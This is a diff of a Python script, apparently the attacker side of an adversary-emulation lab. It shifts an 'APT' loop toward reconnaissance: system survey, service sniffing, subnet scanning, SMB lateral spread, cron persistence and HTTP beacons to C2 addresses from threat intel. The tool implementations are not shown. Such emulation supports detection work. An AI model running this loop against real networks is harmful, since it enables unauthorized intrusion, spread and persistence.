@@ -1,66 +1,82 @@
 #!/usr/bin/env python3
 """
-Red Brain (APT Edition)
-Uses Advanced Tools for realistic emulation.
+Red Brain (Recon-Centric APT)
+Prioritizes Intelligence Gathering (Survey/Sniff) over noise.
 """
 
 import time
 import random
 import logging
-import threading
 from threat_intel import ThreatIntel
-from red_tools import TrafficGenerator, DGA, PersistenceManager
+from red_tools import (
+    TrafficGenerator, DGA, PersistenceManager, LateralMover,
+    PrivEsc, ExfiltrationEngine, SystemSurveyor, NetworkSniffer
+)
 from db_manager import DatabaseManager
 import config
 
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - [RED APT] - %(message)s')
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - [RED RECON] - %(message)s')
 
 class RedAPT:
     def __init__(self):
         self.db = DatabaseManager()
-        self.ti = ThreatIntel() # Relies on DB now
+        self.ti = ThreatIntel()
+
+        # Recon Tools
+        self.surveyor = SystemSurveyor()
+        self.sniffer = NetworkSniffer()
+
+        # Offensive Tools
         self.traffic = TrafficGenerator()
         self.dga = DGA()
         self.persist = PersistenceManager()
+        self.lateral = LateralMover()
+        self.privesc = PrivEsc()
+        self.exfil = ExfiltrationEngine()
+
         self.running = True
+        self.intel_cache = {}
 
     def run(self):
-        logging.info("Red APT Initialized. Entering Stealth Mode.")
+        logging.info("Red APT Initialized. Phase: DEEP RECONNAISSANCE.")
 
         while self.running:
             try:
-                # 1. Traffic Generation (Beaconing)
-                # 30% chance to beacon
-                if random.random() < 0.3:
-                    target_ip = self.ti.get_c2_ip()
-                    if target_ip:
-                        logging.info(f"Sending HTTP Beacon to {target_ip}")
-                        self.traffic.send_http_beacon(target_ip)
-                        self.db.log_event("RED", "BEACON", f"Target: {target_ip}")
-
-                # 2. DGA (DNS Noise)
-                # 20% chance to resolve random domain
-                if random.random() < 0.2:
-                    domain = self.dga.generate_domain()
-                    logging.info(f"DGA Resolution Attempt: {domain}")
-                    self.dga.resolve_domain(domain)
-                    self.db.log_event("RED", "DGA", domain)
-
-                # 3. Persistence
-                # 5% chance to drop persistence if not already established
-                if random.random() < 0.05:
-                    method = random.choice(["cron", "bashrc"])
-                    if method == "cron":
-                        self.persist.install_cron()
-                        logging.info("Installed Cron Persistence")
+                # 70% Chance of Recon Actions
+                if random.random() < 0.7:
+                    if random.random() < 0.5:
+                        logging.info("Conducting System Survey...")
+                        info = self.surveyor.collect_system_info()
+                        self.intel_cache['sys'] = info
+                        self.db.log_event("RED", "RECON_SYS", f"Host: {info['hostname']}")
                     else:
-                        self.persist.install_bashrc()
-                        logging.info("Installed Bashrc Persistence")
-                    self.db.log_event("RED", "PERSIST", method)
+                        logging.info("Sniffing Network Services...")
+                        services = self.sniffer.scan_active_services()
+                        if services:
+                            logging.info(f"Discovered Services: {services}")
+                            self.db.log_event("RED", "RECON_NET", str(services))
 
-                # 4. Sleep (Jitter)
-                # Random sleep 1-5 seconds
-                time.sleep(random.uniform(1.0, 5.0))
+                # 30% Chance of Active Ops (Beacon, Lateral, PrivEsc)
+                else:
+                    action = random.choice(['beacon', 'lateral', 'persist'])
+
+                    if action == 'beacon':
+                        target_ip = self.ti.get_c2_ip()
+                        if target_ip:
+                            self.traffic.send_http_beacon(target_ip)
+                            self.db.log_event("RED", "BEACON", target_ip)
+
+                    elif action == 'lateral':
+                        neighbors = self.lateral.scan_local_subnet()
+                        if neighbors:
+                            target = random.choice(neighbors)
+                            self.lateral.attempt_smb_spread(target[0])
+
+                    elif action == 'persist':
+                        self.persist.install_cron()
+
+                # Low & Slow Jitter (5-15s)
+                time.sleep(random.uniform(5.0, 15.0))
 
             except KeyboardInterrupt:
                 self.running = False
